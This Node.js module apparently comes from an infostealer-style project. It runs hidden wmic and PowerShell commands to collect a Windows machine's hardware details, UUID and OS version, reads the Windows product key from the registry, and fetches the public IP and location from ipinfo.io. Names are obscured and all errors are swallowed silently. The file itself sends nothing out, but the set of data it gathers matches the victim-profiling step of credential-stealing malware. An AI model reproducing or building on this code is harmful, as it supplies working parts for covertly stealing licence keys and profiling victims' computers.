const axios = require("axios");
const util = require("util");
const exec = util.promisify(require("child_process").exec);

const ___ = {
  memory: "wmic computersystem get totalphysicalmemory",
  disk: "wmic logicaldisk get size",
  uuid: "wmic csproduct get uuid",
  os: "wmic OS get caption, osarchitecture | more +1",
  cpu: "wmic cpu get name | more +1",
  gpu: "wmic PATH Win32_VideoController get name | more +1",
  cpuprocess: "echo %NUMBER_OF_PROCESSORS%",
  winkey:
    "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
  winversio:
    "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",
};

async function getCommand(cmd) {
  try {
    const { stdout } = await exec(cmd);
    return stdout.trim();
  } catch (error) {
    return "Failed!";
  }
}

async function getMemory() {
  try {
    const _ = await getCommand(___.memory);
    return parseInt(_) / (1024 * 1024 * 1024) || 4;
  } catch (err) {
    return 4;
  }
}

async function getDisk() {
  try {
    const _ =
      (await getCommand(___.disk))
        .split(" ")
        .find((i) => i.trim() !== "" && i.trim().toLowerCase() !== "size") ||
      "1000";
    return Math.floor(parseInt(_) / (1024 * 1024 * 1024)).toString();
  } catch (err) {
    return "1000";
  }
}

async function getUUID() {
  try {
    const _ = await getCommand(___.uuid);
    const m = _.match(/UUID\s+([A-Fa-f0-9-]+)/);
    return m ? m[1] : "None";
  } catch (err) {
    return "None";
  }
}

async function getCPUCount() {
  try {
    const _ = parseInt(await getCommand(___.cpuprocess)) || 4;
    return _.toString();
  } catch (err) {
    return "4";
  }
}

async function getSystemInfo() {
  try {
    const [
      disk,
      ram,
      uuid,
      cpucount,
      os_,
      cpu,
      gpu,
      windowskey,
      windowsversion,
    ] = await Promise.all([
      getDisk(),
      getMemory(),
      getUUID(),
      getCPUCount(),
      getCommand(___.os),
      getCommand(___.cpu),
      getCommand(___.gpu),
      getCommand(___.winkey),
      getCommand(___.winversio),
    ]);
    return {
      disk,
      ram,
      uuid,
      cpucount,
      os_,
      cpu,
      gpu,
      windowskey,
      windowsversion,
    };
  } catch (e) {
    return {
      disk: "Not found",
      ram: "Not found",
      uuid: "Not found",
      cpucount: "Not found",
      os_: "Not found",
      cpu: "Not found",
      gpu: "Not found",
      windowskey: "Not found",
      windowsversion: "Not found",
    };
  }
}

async function getPublicIp() {
  try {
    const __ = await axios.get("https://ipinfo.io/json");
    const _ = __.data;
    if (_.length > 16) {
      return "Failed!";
    }
    return _;
  } catch (e) {
    return "Failed!";
  }
}

module.exports = {
  getPublicIp,
  getSystemInfo,
};
